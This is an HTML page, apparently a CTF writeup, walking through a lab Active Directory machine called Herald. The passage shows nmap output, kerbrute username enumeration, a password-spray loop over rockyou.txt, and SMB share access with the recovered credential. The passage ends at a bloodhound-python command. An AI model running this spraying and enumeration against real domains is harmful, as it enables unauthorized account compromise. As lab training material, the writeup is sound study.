@@ -1,0 +1,395 @@
+<!doctype html><html lang=en><head><title>Herald · z3r0s</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta name=author content="z3r0s"><meta name=description content="Nmap Scan
+[12ms][127][~/herald]$ nmap -sCV 10.0.12.3
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-13 17:45 -0400
+Stats: 0:00:50 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 99.95% done; ETC: 17:46 (0:00:00 remaining)
+Nmap scan report for herald.htb (10.0.12.3)
+Host is up (0.00091s latency).
+Not shown: 986 filtered tcp ports (no-response)
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-13 21:45:30Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: herald.htb, Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
+| ms-sql-info: 
+|   10.0.12.3:1433: 
+|     Version: 
+|       name: Microsoft SQL Server 2019 RTM
+|       number: 15.00.2000.00
+|       Product: Microsoft SQL Server 2019
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 1433
+|_ssl-date: 2026-04-13T21:46:08+00:00; -3s from scanner time.
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2026-04-13T21:42:38
+|_Not valid after:  2056-04-13T21:42:38
+| ms-sql-ntlm-info: 
+|   10.0.12.3:1433: 
+|     Target_Name: HERALD
+|     NetBIOS_Domain_Name: HERALD
+|     NetBIOS_Computer_Name: DC01
+|     DNS_Domain_Name: herald.htb
+|     DNS_Computer_Name: DC01.herald.htb
+|     DNS_Tree_Name: herald.htb
+|_    Product_Version: 10.0.17763
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: herald.htb, Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Service Unavailable
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+MAC Address: 08:00:27:0F:D0:78 (Oracle VirtualBox virtual NIC)
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled and required
+|_clock-skew: mean: 0s, deviation: 3s, median: 1s
+| smb2-time: 
+|   date: 2026-04-13T21:45:35
+|_  start_date: N/A
+|_nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:0f:d0:78 (Oracle VirtualBox virtual NIC)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 61.04 seconds
+add in etc/hosts"><meta name=keywords content="hackthebox,htb,ctf,writeup,cybersecurity,hacking,pentesting,redteam"><meta name=twitter:card content="summary"><meta name=twitter:title content="Herald"><meta name=twitter:description content="Nmap Scan
+[12ms][127][~/herald]$ nmap -sCV 10.0.12.3 Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-13 17:45 -0400 Stats: 0:00:50 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan NSE Timing: About 99.95% done; ETC: 17:46 (0:00:00 remaining) Nmap scan report for herald.htb (10.0.12.3) Host is up (0.00091s latency). Not shown: 986 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2026-04-13 21:45:30Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: herald.htb, Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 1433/tcp open ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM | ms-sql-info: | 10.0.12.3:1433: | Version: | name: Microsoft SQL Server 2019 RTM | number: 15.00.2000.00 | Product: Microsoft SQL Server 2019 | Service pack level: RTM | Post-SP patches applied: false |_ TCP port: 1433 |_ssl-date: 2026-04-13T21:46:08+00:00; -3s from scanner time. | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback | Not valid before: 2026-04-13T21:42:38 |_Not valid after: 2056-04-13T21:42:38 | ms-sql-ntlm-info: | 10.0.12.3:1433: | Target_Name: HERALD | NetBIOS_Domain_Name: HERALD | NetBIOS_Computer_Name: DC01 | DNS_Domain_Name: herald.htb | DNS_Computer_Name: DC01.herald.htb | DNS_Tree_Name: herald.htb |_ Product_Version: 10.0.17763 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: herald.htb, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5357/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Service Unavailable 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 MAC Address: 08:00:27:0F:D0:78 (Oracle VirtualBox virtual NIC) Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3.1.1: |_ Message signing enabled and required |_clock-skew: mean: 0s, deviation: 3s, median: 1s | smb2-time: | date: 2026-04-13T21:45:35 |_ start_date: N/A |_nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:0f:d0:78 (Oracle VirtualBox virtual NIC) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 61.04 seconds add in etc/hosts"><meta property="og:url" content="https://z3r0s6.github.io/machines/herald/"><meta property="og:site_name" content="z3r0s"><meta property="og:title" content="Herald"><meta property="og:description" content="Nmap Scan
+[12ms][127][~/herald]$ nmap -sCV 10.0.12.3 Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-13 17:45 -0400 Stats: 0:00:50 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan NSE Timing: About 99.95% done; ETC: 17:46 (0:00:00 remaining) Nmap scan report for herald.htb (10.0.12.3) Host is up (0.00091s latency). Not shown: 986 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2026-04-13 21:45:30Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: herald.htb, Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 1433/tcp open ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM | ms-sql-info: | 10.0.12.3:1433: | Version: | name: Microsoft SQL Server 2019 RTM | number: 15.00.2000.00 | Product: Microsoft SQL Server 2019 | Service pack level: RTM | Post-SP patches applied: false |_ TCP port: 1433 |_ssl-date: 2026-04-13T21:46:08+00:00; -3s from scanner time. | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback | Not valid before: 2026-04-13T21:42:38 |_Not valid after: 2056-04-13T21:42:38 | ms-sql-ntlm-info: | 10.0.12.3:1433: | Target_Name: HERALD | NetBIOS_Domain_Name: HERALD | NetBIOS_Computer_Name: DC01 | DNS_Domain_Name: herald.htb | DNS_Computer_Name: DC01.herald.htb | DNS_Tree_Name: herald.htb |_ Product_Version: 10.0.17763 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: herald.htb, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5357/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Service Unavailable 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 MAC Address: 08:00:27:0F:D0:78 (Oracle VirtualBox virtual NIC) Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3.1.1: |_ Message signing enabled and required |_clock-skew: mean: 0s, deviation: 3s, median: 1s | smb2-time: | date: 2026-04-13T21:45:35 |_ start_date: N/A |_nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:0f:d0:78 (Oracle VirtualBox virtual NIC) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 61.04 seconds add in etc/hosts"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="machines"><meta property="article:published_time" content="2026-05-10T00:00:00+00:00"><meta property="article:modified_time" content="2026-05-10T00:00:00+00:00"><meta property="article:tag" content="Custom"><meta property="article:tag" content="Windows"><meta property="article:tag" content="VeryEasy"><meta property="article:tag" content="ActiveDirectory"><link rel=canonical href=https://z3r0s6.github.io/machines/herald/><link rel=preload href=/fonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin><link rel=stylesheet href=/css/coder.min.f6b1b35a7b02521b25338f6cf58975f9980a6c12847763fe35a48307758cd1e7.css integrity="sha256-9rGzWnsCUhslM49s9Yl1+ZgKbBKEd2P+NaSDB3WM0ec=" crossorigin=anonymous media=screen><link rel=stylesheet href=/css/coder-dark.min.ad48f476275974885bdc03d5251e3cdbe1678c54a63ff772376b0ed2adc468dd.css integrity="sha256-rUj0didZdIhb3APVJR482+FnjFSmP/dyN2sO0q3EaN0=" crossorigin=anonymous media=screen><link rel=icon type=image/svg+xml href=/images/favicon.svg sizes=any><link rel=icon type=image/png href=/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/images/safari-pinned-tab.svg color=#5bbad5></head><body class="preload-transitions colorscheme-dark"><div class=float-container><a id=dark-mode-toggle class=colorscheme-toggle><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></a></div><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=https://z3r0s6.github.io/>z3r0s
+</a><input type=checkbox id=menu-toggle>
+<label class="menu-button float-right" for=menu-toggle><i class="fa-solid fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/posts/>Posts</a></li><li class=navigation-item><a class=navigation-link href=/about/>About</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=https://z3r0s6.github.io/machines/herald/>Herald</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa-solid fa-calendar" aria-hidden=true></i>
+<time datetime=2026-05-10T00:00:00Z>May 10, 2026
+</time></span><span class=reading-time><i class="fa-solid fa-clock" aria-hidden=true></i>
+9-minute read</span></div><div class=categories><i class="fa-solid fa-folder" aria-hidden=true></i>
+<a href=/categories/machineschallenges/>Machines&amp;Challenges</a></div><div class=tags><i class="fa-solid fa-tag" aria-hidden=true></i>
+<span class=tag><a href=/tags/custom/>Custom</a>
+</span><span class=separator>•</span>
+<span class=tag><a href=/tags/windows/>Windows</a>
+</span><span class=separator>•</span>
+<span class=tag><a href=/tags/veryeasy/>VeryEasy</a>
+</span><span class=separator>•</span>
+<span class=tag><a href=/tags/activedirectory/>ActiveDirectory</a></span></div></div></header><div class=post-content><p>Nmap Scan</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>12ms<span style=color:#ff7b72;font-weight:700>][</span>127<span style=color:#ff7b72;font-weight:700>][</span>~/herald<span style=color:#ff7b72;font-weight:700>]</span>$ nmap -sCV 10.0.12.3
+</span></span><span style=display:flex><span>Starting Nmap 7.98 <span style=color:#ff7b72;font-weight:700>(</span> https://nmap.org <span style=color:#ff7b72;font-weight:700>)</span> at 2026-04-13 17:45 -0400
+</span></span><span style=display:flex><span>Stats: 0:00:50 elapsed; <span style=color:#a5d6ff>0</span> hosts completed <span style=color:#ff7b72;font-weight:700>(</span><span style=color:#a5d6ff>1</span> up<span style=color:#ff7b72;font-weight:700>)</span>, <span style=color:#a5d6ff>1</span> undergoing Script Scan
+</span></span><span style=display:flex><span>NSE Timing: About 99.95% <span style=color:#ff7b72>done</span>; ETC: 17:46 <span style=color:#ff7b72;font-weight:700>(</span>0:00:00 remaining<span style=color:#ff7b72;font-weight:700>)</span>
+</span></span><span style=display:flex><span>Nmap scan report <span style=color:#ff7b72>for</span> herald.htb <span style=color:#ff7b72;font-weight:700>(</span>10.0.12.3<span style=color:#ff7b72;font-weight:700>)</span>
+</span></span><span style=display:flex><span>Host is up <span style=color:#ff7b72;font-weight:700>(</span>0.00091s latency<span style=color:#ff7b72;font-weight:700>)</span>.
+</span></span><span style=display:flex><span>Not shown: <span style=color:#a5d6ff>986</span> filtered tcp ports <span style=color:#ff7b72;font-weight:700>(</span>no-response<span style=color:#ff7b72;font-weight:700>)</span>
+</span></span><span style=display:flex><span>PORT     STATE SERVICE       VERSION
+</span></span><span style=display:flex><span>53/tcp   open  domain        Simple DNS Plus
+</span></span><span style=display:flex><span>88/tcp   open  kerberos-sec  Microsoft Windows Kerberos <span style=color:#ff7b72;font-weight:700>(</span>server time: 2026-04-13 21:45:30Z<span style=color:#ff7b72;font-weight:700>)</span>
+</span></span><span style=display:flex><span>135/tcp  open  msrpc         Microsoft Windows RPC
+</span></span><span style=display:flex><span>139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span style=display:flex><span>389/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style=color:#ff7b72;font-weight:700>(</span>Domain: herald.htb, Site: Default-First-Site-Name<span style=color:#ff7b72;font-weight:700>)</span>
+</span></span><span style=display:flex><span>445/tcp  open  microsoft-ds?
+</span></span><span style=display:flex><span>464/tcp  open  kpasswd5?
+</span></span><span style=display:flex><span>593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span style=display:flex><span>636/tcp  open  tcpwrapped
+</span></span><span style=display:flex><span>1433/tcp open  ms-sql-s      Microsoft SQL Server <span style=color:#a5d6ff>2019</span> 15.00.2000.00; RTM
+</span></span><span style=display:flex><span>| ms-sql-info: 
+</span></span><span style=display:flex><span>|   10.0.12.3:1433: 
+</span></span><span style=display:flex><span>|     Version: 
+</span></span><span style=display:flex><span>|       name: Microsoft SQL Server <span style=color:#a5d6ff>2019</span> RTM
+</span></span><span style=display:flex><span>|       number: 15.00.2000.00
+</span></span><span style=display:flex><span>|       Product: Microsoft SQL Server <span style=color:#a5d6ff>2019</span>
+</span></span><span style=display:flex><span>|       Service pack level: RTM
+</span></span><span style=display:flex><span>|       Post-SP patches applied: false
+</span></span><span style=display:flex><span>|_    TCP port: <span style=color:#a5d6ff>1433</span>
+</span></span><span style=display:flex><span>|_ssl-date: 2026-04-13T21:46:08+00:00; -3s from scanner time.
+</span></span><span style=display:flex><span>| ssl-cert: Subject: <span style=color:#79c0ff>commonName</span><span style=color:#ff7b72;font-weight:700>=</span>SSL_Self_Signed_Fallback
+</span></span><span style=display:flex><span>| Not valid before: 2026-04-13T21:42:38
+</span></span><span style=display:flex><span>|_Not valid after:  2056-04-13T21:42:38
+</span></span><span style=display:flex><span>| ms-sql-ntlm-info: 
+</span></span><span style=display:flex><span>|   10.0.12.3:1433: 
+</span></span><span style=display:flex><span>|     Target_Name: HERALD
+</span></span><span style=display:flex><span>|     NetBIOS_Domain_Name: HERALD
+</span></span><span style=display:flex><span>|     NetBIOS_Computer_Name: DC01
+</span></span><span style=display:flex><span>|     DNS_Domain_Name: herald.htb
+</span></span><span style=display:flex><span>|     DNS_Computer_Name: DC01.herald.htb
+</span></span><span style=display:flex><span>|     DNS_Tree_Name: herald.htb
+</span></span><span style=display:flex><span>|_    Product_Version: 10.0.17763
+</span></span><span style=display:flex><span>3268/tcp open  ldap          Microsoft Windows Active Directory LDAP <span style=color:#ff7b72;font-weight:700>(</span>Domain: herald.htb, Site: Default-First-Site-Name<span style=color:#ff7b72;font-weight:700>)</span>
+</span></span><span style=display:flex><span>3269/tcp open  tcpwrapped
+</span></span><span style=display:flex><span>5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span style=color:#ff7b72;font-weight:700>(</span>SSDP/UPnP<span style=color:#ff7b72;font-weight:700>)</span>
+</span></span><span style=display:flex><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style=display:flex><span>|_http-title: Service Unavailable
+</span></span><span style=display:flex><span>5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span style=color:#ff7b72;font-weight:700>(</span>SSDP/UPnP<span style=color:#ff7b72;font-weight:700>)</span>
+</span></span><span style=display:flex><span>|_http-title: Not Found
+</span></span><span style=display:flex><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style=display:flex><span>MAC Address: 08:00:27:0F:D0:78 <span style=color:#ff7b72;font-weight:700>(</span>Oracle VirtualBox virtual NIC<span style=color:#ff7b72;font-weight:700>)</span>
+</span></span><span style=display:flex><span>Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Host script results:
+</span></span><span style=display:flex><span>| smb2-security-mode: 
+</span></span><span style=display:flex><span>|   3.1.1: 
+</span></span><span style=display:flex><span>|_    Message signing enabled and required
+</span></span><span style=display:flex><span>|_clock-skew: mean: 0s, deviation: 3s, median: 1s
+</span></span><span style=display:flex><span>| smb2-time: 
+</span></span><span style=display:flex><span>|   date: 2026-04-13T21:45:35
+</span></span><span style=display:flex><span>|_  start_date: N/A
+</span></span><span style=display:flex><span>|_nbstat: NetBIOS name: DC01, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:0f:d0:78 <span style=color:#ff7b72;font-weight:700>(</span>Oracle VirtualBox virtual NIC<span style=color:#ff7b72;font-weight:700>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style=display:flex><span>Nmap <span style=color:#ff7b72>done</span>: <span style=color:#a5d6ff>1</span> IP address <span style=color:#ff7b72;font-weight:700>(</span><span style=color:#a5d6ff>1</span> host up<span style=color:#ff7b72;font-weight:700>)</span> scanned in 61.04 seconds
+</span></span></code></pre></div><p>add in etc/hosts</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>10.0.12.3 herald.htb DC01.herald.htb
+</span></span></code></pre></div><p>We tried SMB Null Session but didnt work so let’s try enumerate Users:</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>./kerbrute_linux_amd64 userenum -d herald.htb --dc 10.0.12.3 xato-net-10-million-usernames-dup.txt -o valid_ad_users
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    __             __               __     
+</span></span><span style=display:flex><span>   / /_____  _____/ /_  _______  __/ /____ 
+</span></span><span style=display:flex><span>  / //_/ _ <span style=color:#79c0ff>\/</span> ___/ __ <span style=color:#79c0ff>\/</span> ___/ / / / __/ _ <span style=color:#79c0ff>\
+</span></span></span><span style=display:flex><span> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+</span></span><span style=display:flex><span>/_/|_|<span style=color:#79c0ff>\_</span>__/_/  /_.___/_/   <span style=color:#79c0ff>\_</span>_,_/<span style=color:#79c0ff>\_</span>_/<span style=color:#79c0ff>\_</span>__/                                        
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Version: v1.0.3 <span style=color:#ff7b72;font-weight:700>(</span>9dad6e1<span style=color:#ff7b72;font-weight:700>)</span> - 04/13/26 - Ronnie Flathers @ropnop
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>2026/04/13 17:51:45 &gt;  Using KDC<span style=color:#ff7b72;font-weight:700>(</span>s<span style=color:#ff7b72;font-weight:700>)</span>:
+</span></span><span style=display:flex><span>2026/04/13 17:51:45 &gt;  	10.0.12.3:88
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>2026/04/13 17:51:45 &gt;  <span style=color:#ff7b72;font-weight:700>[</span>+<span style=color:#ff7b72;font-weight:700>]</span> VALID USERNAME:	 alexis@herald.htb
+</span></span><span style=display:flex><span>2026/04/13 17:51:45 &gt;  <span style=color:#ff7b72;font-weight:700>[</span>+<span style=color:#ff7b72;font-weight:700>]</span> VALID USERNAME:	 great@herald.htb
+</span></span><span style=display:flex><span>2026/04/13 17:51:45 &gt;  <span style=color:#ff7b72;font-weight:700>[</span>+<span style=color:#ff7b72;font-weight:700>]</span> VALID USERNAME:	 power@herald.htb
+</span></span><span style=display:flex><span>2026/04/13 17:51:45 &gt;  <span style=color:#ff7b72;font-weight:700>[</span>+<span style=color:#ff7b72;font-weight:700>]</span> VALID USERNAME:	 jacob@herald.htb
+</span></span><span style=display:flex><span>2026/04/13 17:51:45 &gt;  <span style=color:#ff7b72;font-weight:700>[</span>+<span style=color:#ff7b72;font-weight:700>]</span> VALID USERNAME:	 hank@herald.htb
+</span></span><span style=display:flex><span>2026/04/13 17:51:45 &gt;  <span style=color:#ff7b72;font-weight:700>[</span>+<span style=color:#ff7b72;font-weight:700>]</span> VALID USERNAME:	 alberto@herald.htb
+</span></span><span style=display:flex><span>2026/04/13 17:51:46 &gt;  <span style=color:#ff7b72;font-weight:700>[</span>+<span style=color:#ff7b72;font-weight:700>]</span> VALID USERNAME:	 administrator@herald.htb
+</span></span><span style=display:flex><span>2026/04/13 17:51:48 &gt;  <span style=color:#ff7b72;font-weight:700>[</span>+<span style=color:#ff7b72;font-weight:700>]</span> VALID USERNAME:	 Alberto@herald.htb
+</span></span><span style=display:flex><span>2026/04/13 17:51:49 &gt;  <span style=color:#ff7b72;font-weight:700>[</span>+<span style=color:#ff7b72;font-weight:700>]</span> VALID USERNAME:	 Power@herald.htb
+</span></span><span style=display:flex><span>2026/04/13 17:51:49 &gt;  <span style=color:#ff7b72;font-weight:700>[</span>+<span style=color:#ff7b72;font-weight:700>]</span> VALID USERNAME:	 Great@herald.htb
+</span></span><span style=display:flex><span>2026/04/13 17:51:49 &gt;  <span style=color:#ff7b72;font-weight:700>[</span>+<span style=color:#ff7b72;font-weight:700>]</span> VALID USERNAME:	 Alexis@herald.htb
+</span></span><span style=display:flex><span>2026/04/13 17:51:53 &gt;  <span style=color:#ff7b72;font-weight:700>[</span>+<span style=color:#ff7b72;font-weight:700>]</span> VALID USERNAME:	 Jacob@herald.htb
+</span></span><span style=display:flex><span>2026/04/13 17:51:54 &gt;  <span style=color:#ff7b72;font-weight:700>[</span>+<span style=color:#ff7b72;font-weight:700>]</span> VALID USERNAME:	 Administrator@herald.htb
+</span></span></code></pre></div><p>save it in user.txt and lets try password spray</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#ff7b72>while</span> read pass; <span style=color:#ff7b72>do</span>                                                                                                                                                                                                                       
+</span></span><span style=display:flex><span>    ./kerbrute_linux_amd64 passwordspray --dc 10.0.12.3 -d herald.htb users.txt <span style=color:#a5d6ff>&#34;</span><span style=color:#79c0ff>$pass</span><span style=color:#a5d6ff>&#34;</span> 2&gt;/dev/null | grep <span style=color:#a5d6ff>&#34;VALID&#34;</span>                                                                                                                          
+</span></span><span style=display:flex><span>  <span style=color:#ff7b72>done</span> &lt; /usr/share/wordlists/rockyou.txt
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>+<span style=color:#ff7b72;font-weight:700>]</span> VALID LOGIN:	 alexis@herald.htb:mylove  
+</span></span></code></pre></div><p>Lets Check smb if worked</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>crackmapexec smb 10.0.12.3 -u alexis -p mylove --shares
+</span></span><span style=display:flex><span>SMB         10.0.12.3       <span style=color:#a5d6ff>445</span>    DC01             <span style=color:#ff7b72;font-weight:700>[</span>*<span style=color:#ff7b72;font-weight:700>]</span> Windows <span style=color:#a5d6ff>10</span> / Server <span style=color:#a5d6ff>2019</span> Build <span style=color:#a5d6ff>17763</span> x64 <span style=color:#ff7b72;font-weight:700>(</span>name:DC01<span style=color:#ff7b72;font-weight:700>)</span> <span style=color:#ff7b72;font-weight:700>(</span>domain:herald.htb<span style=color:#ff7b72;font-weight:700>)</span> <span style=color:#ff7b72;font-weight:700>(</span>signing:True<span style=color:#ff7b72;font-weight:700>)</span> <span style=color:#ff7b72;font-weight:700>(</span>SMBv1:False<span style=color:#ff7b72;font-weight:700>)</span>
+</span></span><span style=display:flex><span>SMB         10.0.12.3       <span style=color:#a5d6ff>445</span>    DC01             <span style=color:#ff7b72;font-weight:700>[</span>+<span style=color:#ff7b72;font-weight:700>]</span> herald.htb<span style=color:#79c0ff>\a</span>lexis:mylove 
+</span></span><span style=display:flex><span>SMB         10.0.12.3       <span style=color:#a5d6ff>445</span>    DC01             <span style=color:#ff7b72;font-weight:700>[</span>+<span style=color:#ff7b72;font-weight:700>]</span> Enumerated shares
+</span></span><span style=display:flex><span>SMB         10.0.12.3       <span style=color:#a5d6ff>445</span>    DC01             Share           Permissions     Remark
+</span></span><span style=display:flex><span>SMB         10.0.12.3       <span style=color:#a5d6ff>445</span>    DC01             -----           -----------     ------
+</span></span><span style=display:flex><span>SMB         10.0.12.3       <span style=color:#a5d6ff>445</span>    DC01             ADMIN$                          Remote Admin
+</span></span><span style=display:flex><span>SMB         10.0.12.3       <span style=color:#a5d6ff>445</span>    DC01             C$                              Default share
+</span></span><span style=display:flex><span>SMB         10.0.12.3       <span style=color:#a5d6ff>445</span>    DC01             heappwn         READ            Project development share
+</span></span><span style=display:flex><span>SMB         10.0.12.3       <span style=color:#a5d6ff>445</span>    DC01             IPC$            READ            Remote IPC
+</span></span><span style=display:flex><span>SMB         10.0.12.3       <span style=color:#a5d6ff>445</span>    DC01             NETLOGON        READ            Logon server share 
+</span></span><span style=display:flex><span>SMB         10.0.12.3       <span style=color:#a5d6ff>445</span>    DC01             SYSVOL          READ            Logon server share
+</span></span></code></pre></div><p>its worked lets login and heappwn its Project development share !</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>smbclient //10.10.10.5/heappwn -U alexis%mylove
+</span></span><span style=display:flex><span>smb: <span style=color:#79c0ff>\&gt;</span> ls
+</span></span><span style=display:flex><span>  .                                   D        <span style=color:#a5d6ff>0</span>  Mon Apr <span style=color:#a5d6ff>13</span> 17:47:47 <span style=color:#a5d6ff>2026</span>
+</span></span><span style=display:flex><span>  ..                                  D        <span style=color:#a5d6ff>0</span>  Mon Apr <span style=color:#a5d6ff>13</span> 17:47:47 <span style=color:#a5d6ff>2026</span>
+</span></span><span style=display:flex><span>  dbconnect                           A    <span style=color:#a5d6ff>16536</span>  Mon Apr <span style=color:#a5d6ff>13</span> 17:47:45 <span style=color:#a5d6ff>2026</span>
+</span></span><span style=display:flex><span>  README.txt                          A      <span style=color:#a5d6ff>112</span>  Mon Apr <span style=color:#a5d6ff>13</span> 14:53:55 <span style=color:#a5d6ff>2026</span>
+</span></span></code></pre></div><p>lets try bloodhound</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>bloodhound-python -u <span style=color:#a5d6ff>&#34;alexis&#34;</span> -p <span style=color:#a5d6ff>&#39;mylove&#39;</span> -d herald.htb -c all --zip -ns 10.0.12.3
